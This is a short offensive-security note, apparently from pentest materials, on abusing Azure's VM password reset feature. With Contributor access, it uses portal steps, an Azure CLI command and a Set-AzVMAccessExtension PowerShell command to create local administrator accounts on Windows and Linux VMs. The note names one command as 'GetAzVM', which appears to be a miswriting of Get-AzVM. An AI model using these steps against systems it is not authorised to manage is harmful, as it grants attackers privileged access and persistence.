# Exploiting Password Reset Feature

## Requirements: Contributor account/role access

## Tools: Lava, Azure Portal , Azure command line

### The password reset feature for Azure VMs was intended to simplify the process of resetting the password of a local Azure VM user, using the VM agent that is installed on every Azure VM. However, this feature could be abused to create new local users with administrative privileges on both Windows and Linux VMs in Azure!

## VM Enumeration command

    GetAzVM

# 1) Azure Portal

 - On the target VM, go to "reset password" then choose our newly created user and set his new password.

# 2) Azure CLI

    az vm user update -u USERNAME -p PASSWORD -n VM_NAME -g RESOURCE_GROUP (Create a local user for a VM.)

# 3) Azure Powershell

    Set-AzVMAccessExtension -ResourceGroupName "RESOURCE_GROUP" -Location "LOCATION" -VMName "VM_NAME" -Name "EXTENSION_NAME" -TypeHandlerVersion "2.4" -UserName "USERNAME" -Password "PASSWORD"
